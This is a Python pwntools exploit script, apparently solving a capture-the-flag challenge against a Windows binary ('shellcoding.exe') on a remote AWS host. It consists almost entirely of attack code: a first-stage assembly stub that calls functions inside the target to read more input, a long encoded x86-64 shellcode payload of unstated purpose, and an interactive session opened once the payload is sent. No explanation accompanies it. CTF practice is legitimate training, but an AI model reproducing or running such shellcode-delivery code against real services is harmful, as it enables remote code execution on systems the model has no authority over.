from pwn import *

context.arch = "amd64"
# p = process(["wine", "./shellcoding.exe"])
p = remote("ec2-3-1-204-6.ap-southeast-1.compute.amazonaws.com", 65391)

fgets = 0x14000B680
buf = 0x14000f060
get_file = 0x140001FE0 

buf =  b"\x90"*5
buf += b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\x79\xa5\x5f\x87\x9d"
buf += b"\x12\x9f\x7a\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\x85\xed\xdc\x63\x6d\xfa\x5f\x7a\x79"
buf += b"\xa5\x1e\xd6\xdc\x42\xcd\x2b\x2f\xed\x6e\x55\xf8"
buf += b"\x5a\x14\x28\x19\xed\xd4\xd5\x85\x5a\x14\x28\x59"
buf += b"\xed\xd4\xf5\xcd\x5a\x90\xcd\x33\xef\x12\xb6\x54"
buf += b"\x5a\xae\xba\xd5\x99\x3e\xfb\x9f\x3e\xbf\x3b\xb8"
buf += b"\x6c\x52\xc6\x9c\xd3\x7d\x97\x2b\xe4\x0e\xcf\x16"
buf += b"\x40\xbf\xf1\x3b\x99\x17\x86\x4d\x99\x1f\xf2\x79"
buf += b"\xa5\x5f\xcf\x18\xd2\xeb\x1d\x31\xa4\x8f\xd7\x16"
buf += b"\x5a\x87\x3e\xf2\xe5\x7f\xce\x9c\xc2\x7c\x2c\x31"
buf += b"\x5a\x96\xc6\x16\x26\x17\x32\x78\x73\x12\xb6\x54"
buf += b"\x5a\xae\xba\xd5\xe4\x9e\x4e\x90\x53\x9e\xbb\x41"
buf += b"\x45\x2a\x76\xd1\x11\xd3\x5e\x71\xe0\x66\x56\xe8"
buf += b"\xca\xc7\x3e\xf2\xe5\x7b\xce\x9c\xc2\xf9\x3b\xf2"
buf += b"\xa9\x17\xc3\x16\x52\x83\x33\x78\x75\x1e\x0c\x99"
buf += b"\x9a\xd7\x7b\xa9\xe4\x07\xc6\xc5\x4c\xc6\x20\x38"
buf += b"\xfd\x1e\xde\xdc\x48\xd7\xf9\x95\x85\x1e\xd5\x62"
buf += b"\xf2\xc7\x3b\x20\xff\x17\x0c\x8f\xfb\xc8\x85\x86"
buf += b"\x5a\x02\xce\x23\x65\xec\x48\x26\x96\x6d\x87\x9d"
buf += b"\x53\xc9\x33\xf0\x43\x17\x06\x71\xb2\x9e\x7a\x79"
buf += b"\xec\xd6\x62\xd4\xae\x9d\x7a\x46\x87\x4d\x0f\x09"
buf += b"\xe5\xde\x2e\x30\x2c\xbb\xcb\x14\xe3\xde\xc0\x35"
buf += b"\xd2\x79\x80\x62\xc7\xd3\xf3\x93\xcd\x5e\x86\x9d"
buf += b"\x12\xc6\x3b\xc3\x8c\xdf\xec\x9d\xed\x4a\x2a\x29"
buf += b"\xe8\x6e\x4e\xd0\x23\x5f\x32\x86\x65\x17\x0e\x5f"
buf += b"\x5a\x60\xba\x31\x2c\x9e\xc6\x27\xf8\x90\xa5\x99"
buf += b"\x5a\x8a\xcf\x14\xd5\xf5\x6a\x38\xfd\x13\x0e\x7f"
buf += b"\x5a\x16\x83\x38\x1f\xc6\x22\xe9\x73\x60\xaf\x31"
buf += b"\x24\x9b\xc7\x9f\x12\x9f\x33\xc1\xc6\x32\xe3\x9d"
buf += b"\x12\x9f\x7a\x79\xe4\x0f\xc6\xcd\x5a\x16\x98\x2e"
buf += b"\xf2\x08\xca\xac\xd2\xf5\x77\x20\xe4\x0f\x65\x61"
buf += b"\x74\x58\x3e\x5d\xf1\x5e\x86\xd5\x9f\xdb\x5e\x61"
buf += b"\x63\x5f\xef\xd5\x9b\x79\x2c\x29\xe4\x0f\xc6\xcd"
buf += b"\x53\xcf\x33\x86\x65\x1e\xd7\xd4\xed\x57\x37\xf0"
buf += b"\x64\x13\x0e\x5c\x53\x25\x03\xb5\x9a\xd9\x78\x48"
buf += b"\x5a\xae\xa8\x31\x5a\x95\x0c\x93\x53\x25\x72\xfe"
buf += b"\xb8\x3f\x78\x48\xa9\x6f\xcf\xdb\xf3\x1e\x3d\x3b"
buf += b"\x87\x22\xe7\x86\x70\x17\x04\x59\x3a\xa3\x7c\x05"
buf += b"\xaf\xdf\x7c\x7d\x67\x9a\xc1\x3e\xb6\x2d\xe8\xf7"
buf += b"\x12\xc6\x3b\xf0\x7f\xa0\x52\x9d\x12\x9f\x7a"



lol = asm("""
nop
lea rbx, [rip-0x8-53376]
mov rcx, 0
call rbx
mov r8, rax
mov rdx, 0x500
lea rcx, [rip+0x20-0x17]
lea rbx, [rip-0x8-14816-0x21]
call rbx
""") + b"\x90"*100

p.sendline(lol)
pause()
p.sendline(buf)

p.interactive()
